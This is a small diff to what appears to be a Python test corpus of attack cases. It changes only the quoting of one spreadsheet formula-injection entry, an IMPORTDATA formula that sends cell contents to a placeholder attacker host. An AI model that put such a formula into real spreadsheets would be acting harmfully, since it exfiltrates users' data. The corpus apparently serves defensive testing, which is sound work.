@@ -262,7 +262,7 @@ BASE_ATTACK_CASES: tuple[CorpusCase, ...] = (
     CorpusCase(
         "sheet-formula-001",
         "spreadsheet_formula_injection",
-        "=IMPORTDATA(\"https://attacker.com/steal?data=\"&A1&B1&C1)",
+        '=IMPORTDATA("https://attacker.com/steal?data="&A1&B1&C1)',
         tags=("spreadsheet", "formula"),
     ),
     CorpusCase(
